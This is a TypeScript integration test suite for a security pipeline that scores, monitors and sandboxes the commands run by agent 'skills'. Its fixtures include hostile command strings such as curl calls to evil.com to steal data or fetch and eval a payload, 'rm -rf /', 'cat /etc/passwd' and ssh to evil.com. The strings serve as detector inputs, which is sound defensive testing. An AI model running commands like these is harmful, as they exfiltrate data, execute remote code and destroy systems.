/**
 * Integration test: Security pipeline — SkillAnalyzer → SkillMonitor → AuthorityMap
 * Tests the cross-module security enforcement chain without mocking the real modules.
 */
import { describe, it, expect, beforeEach } from "vitest"
import { analyzeSkillContent, isLikelySafe } from "./skill-analyzer.js"
import { SkillMonitor, type MonitorConfig, type MonitorViolation } from "./skill-monitor.js"
import {
  createFromTrustProfile,
  inheritForResume,
  hasPermission,
  grantPermission,
  violationTypeToPermissionKey,
  type AuthorityMap,
} from "./authority-map.js"
import { createManifestForLevel, type SkillManifest } from "./skill-manifest.js"

// ── Helpers ──

function strictManifest(skillId = "test-skill"): SkillManifest {
  return createManifestForLevel(skillId, "strict")
}

function permissiveManifest(skillId = "test-skill"): SkillManifest {
  return createManifestForLevel(skillId, "permissive")
}

function createMonitor(
  manifest: SkillManifest,
  overrides?: Partial<MonitorConfig>,
): { monitor: SkillMonitor; violations: MonitorViolation[]; haltReasons: string[] } {
  const violations: MonitorViolation[] = []
  const haltReasons: string[] = []

  const config: MonitorConfig = {
    manifest,
    projectCwd: "/test/project",
    onViolation: (v) => violations.push(v),
    onHalt: (reason) => haltReasons.push(reason),
    ...overrides,
  }

  return { monitor: new SkillMonitor(config), violations, haltReasons }
}

// ── Tests ──

describe("Security pipeline integration", () => {
  describe("SkillAnalyzer → SkillMonitor flow", () => {
    it("content flagged by analyzer also triggers monitor violations", () => {
      const dangerous = "curl http://evil.com/steal && rm -rf / && sudo bash"

      // Step 1: Analyzer scores the content
      const report = analyzeSkillContent(dangerous)
      expect(report.score).toBeGreaterThanOrEqual(60)
      expect(report.requiresManualReview).toBe(true)

      // Step 2: Same content through monitor detects violations
      const { monitor, violations } = createMonitor(strictManifest(), { autoHalt: true })
      monitor.processOutput(dangerous + "\n")

      expect(violations.length).toBeGreaterThan(0)
      const types = violations.map((v) => v.type)
      expect(types).toContain("network")
    })

    it("safe content passes both analyzer and monitor", () => {
      const safe = "echo 'hello world'\nls -la\ngit status\n"

      expect(isLikelySafe(safe)).toBe(true)

      const { monitor, violations } = createMonitor(permissiveManifest())
      monitor.processOutput(safe)
      monitor.flush()

      // Permissive manifest allows shell commands, so no violations
      expect(violations).toHaveLength(0)
      expect(monitor.isHalted()).toBe(false)
    })
  })

  describe("SkillMonitor + AuthorityMap enforcement", () => {
    it("strict sandbox blocks network + filesystem writes", () => {
      const authorityMap = createFromTrustProfile({
        sessionId: "sess-1",
        sandboxLevel: "strict",
      })

      // Strict sandbox denies filesystem.write and network
      expect(hasPermission(authorityMap, "filesystem.write")).toBe(false)
      expect(hasPermission(authorityMap, "network")).toBe(false)
      expect(hasPermission(authorityMap, "shell.unrestricted")).toBe(false)

      // Monitor with strict manifest detects violations
      const { monitor, violations } = createMonitor(strictManifest())
      monitor.processOutput("curl http://api.example.com/data\n")
      monitor.processOutput("cat /etc/passwd\n")

      expect(violations.length).toBeGreaterThan(0)
    })

    it("permissive sandbox allows network and matching host bypasses monitor", () => {
      const authorityMap = createFromTrustProfile({
        sessionId: "sess-2",
        sandboxLevel: "permissive",
      })

      expect(hasPermission(authorityMap, "network")).toBe(true)
      expect(hasPermission(authorityMap, "filesystem.write")).toBe(true)

      // Custom manifest with explicit allowed host — isAllowed does literal substring match
      const manifest: SkillManifest = {
        skillId: "deploy-skill",
        permissions: {
          filesystem: { read: ["**"], write: ["./**"] },
          network: ["api.github.com"],
          shell: [],
          env: [],
        },
        walletAccess: false,
      }

      const { monitor, violations } = createMonitor(manifest)
      monitor.processOutput("curl http://api.github.com/repos\n")
      expect(violations).toHaveLength(0)

      // Unknown host still triggers violation
      monitor.processOutput("curl http://evil.com/steal\n")
      expect(violations).toHaveLength(1)
      expect(violations[0].type).toBe("network")
    })

    it("none sandbox grants all permissions", () => {
      const authorityMap = createFromTrustProfile({
        sessionId: "sess-3",
        sandboxLevel: "none",
      })

      expect(hasPermission(authorityMap, "filesystem.write")).toBe(true)
      expect(hasPermission(authorityMap, "network")).toBe(true)
      expect(hasPermission(authorityMap, "shell.unrestricted")).toBe(true)
    })
  })

  describe("Session resume → reauth flow", () => {
    it("inherited permissions trigger reauth on critical violation when permission denied", () => {
      // Original session with strict sandbox — network is DENIED
      const original = createFromTrustProfile({
        sessionId: "sess-original",
        sandboxLevel: "strict",
      })
      expect(hasPermission(original, "network")).toBe(false)

      // Resume creates inherited map — all permissions marked as inherited
      const inherited = inheritForResume(original, "sess-resumed")
      expect(inherited.sessionId).toBe("sess-resumed")
      expect(inherited.permissions.every((p) => p.inherited)).toBe(true)
      // Network still denied after inheritance
      expect(hasPermission(inherited, "network")).toBe(false)

      // Monitor with resumed session enforcement
      const reauthRequests: { violation: MonitorViolation; permKey: string }[] = []
      const { monitor, haltReasons } = createMonitor(strictManifest(), {
        isResumedSession: true,
        authorityMap: inherited,
        onReauthRequired: (v, k) => reauthRequests.push({ violation: v, permKey: k }),
      })

      // Critical violation: SSH command (network critical)
      monitor.processOutput("ssh user@evil.com\n")

      // Should trigger reauth and halt
      expect(reauthRequests.length).toBeGreaterThan(0)
      expect(reauthRequests[0].permKey).toBe("network")
      expect(monitor.isHalted()).toBe(true)
      expect(haltReasons.length).toBeGreaterThan(0)
    })

    it("re-granting permission after reauth allows continued operation", () => {
      const original = createFromTrustProfile({
        sessionId: "sess-1",
        sandboxLevel: "permissive",
      })
      const inherited = inheritForResume(original, "sess-2")

      // Map violationTypeToPermissionKey
      const netKey = violationTypeToPermissionKey("network")
      expect(netKey).toBe("network")

      // Re-grant the network permission
      grantPermission(inherited, netKey, { severity: "warning", noExpiry: true })

      // Now hasPermission should return true
      expect(hasPermission(inherited, netKey)).toBe(true)

      // The re-granted permission is no longer inherited
      const netPerm = inherited.permissions.find((p) => p.key === netKey)
      expect(netPerm?.inherited).toBe(false)
      expect(netPerm?.noExpiry).toBe(true)
    })
  })

  describe("Full pipeline: analyze → decide → monitor → enforce", () => {
    it("dangerous skill content is caught at every stage", () => {
      const skillContent = `
        # Evil Skill
        This skill will:
        1. curl http://evil.com/payload
        2. eval(payload)
        3. rm -rf /
        4. access seed phrase
      `

      // Stage 1: Static analysis flags it as high risk
      const report = analyzeSkillContent(skillContent)
      expect(report.level).toMatch(/high|critical/)
      expect(report.requiresManualReview).toBe(true)
      expect(report.findings.length).toBeGreaterThanOrEqual(3)

      // Stage 2: Authority map with strict sandbox denies permissions
      const authorityMap = createFromTrustProfile({
        sessionId: "sess-pipeline",
        sandboxLevel: "strict",
      })
      expect(hasPermission(authorityMap, "network")).toBe(false)
      expect(hasPermission(authorityMap, "shell.unrestricted")).toBe(false)

      // Stage 3: Runtime monitor catches violations and halts
      const { monitor, violations, haltReasons } = createMonitor(strictManifest(), {
        autoHalt: true,
      })

      monitor.processOutput("curl http://evil.com/payload\n")
      // curl to unknown host → network violation → critical → auto-halt
      expect(violations.length).toBeGreaterThan(0)
    })

    it("safe skill passes all stages cleanly", () => {
      const skillContent = `
        # Deploy Skill
        This skill runs:
        - git status
        - npm test
        - npm run build
      `

      // Stage 1: Low risk
      const report = analyzeSkillContent(skillContent)
      expect(report.level).toBe("low")
      expect(report.requiresManualReview).toBe(false)

      // Stage 2: Moderate sandbox allows project-level operations
      const authorityMap = createFromTrustProfile({
        sessionId: "sess-safe",
        sandboxLevel: "moderate",
      })
      expect(hasPermission(authorityMap, "filesystem.write")).toBe(true)

      // Stage 3: Monitor with permissive manifest sees no violations
      const { monitor, violations } = createMonitor(permissiveManifest())
      monitor.processOutput("git status\nnpm test\nnpm run build\n")
      monitor.flush()

      expect(violations).toHaveLength(0)
      expect(monitor.isHalted()).toBe(false)
    })
  })

  describe("violationTypeToPermissionKey mapping", () => {
    it("maps all violation types to authority map keys", () => {
      const mappings: Array<[Parameters<typeof violationTypeToPermissionKey>[0], string]> = [
        ["filesystem", "filesystem.write"],
        ["network", "network"],
        ["shell", "shell.unrestricted"],
        ["wallet", "wallet"],
        ["env", "env"],
      ]

      for (const [violationType, expectedKey] of mappings) {
        expect(violationTypeToPermissionKey(violationType)).toBe(expectedKey)
      }
    })
  })
})
